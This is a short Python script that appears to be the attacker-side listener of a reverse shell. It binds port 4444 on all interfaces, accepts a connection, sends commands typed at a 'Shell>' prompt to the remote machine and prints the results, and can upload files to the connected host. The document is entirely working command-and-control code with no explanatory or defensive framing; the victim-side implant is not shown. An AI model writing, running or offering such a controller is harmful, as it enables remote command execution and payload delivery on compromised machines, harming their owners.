import socket

HOST = "0.0.0.0"
PORT = 4444

def send_file(conn, filename):
    """Sends a file in binary mode without corruption"""
    try:
        with open(filename, "rb") as f:
            while chunk := f.read(4096):
                conn.send(chunk)
        conn.send(b"EOFEOFEOF")  # End of File Marker
        print(f"[+] File {filename} sent successfully.")
    except FileNotFoundError:
        print("[-] File not found.")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((HOST, PORT))
s.listen(1)

print("[+] Listening for incoming connections...")
conn, addr = s.accept()
print(f"[+] Connection established from {addr}")

while True:
    command = input("Shell> ")
    if command.lower() == "exit":
        conn.send(b"exit")
        break
    elif command.startswith("upload "):
        filename = command.split(" ", 1)[1]
        conn.send(command.encode("utf-8"))
        response = conn.recv(1024).decode()
        if response == "READY":
            send_file(conn, filename)
    else:
        conn.send(command.encode("utf-8"))
        response = conn.recv(4096).decode("utf-8")
        print(response)

conn.close()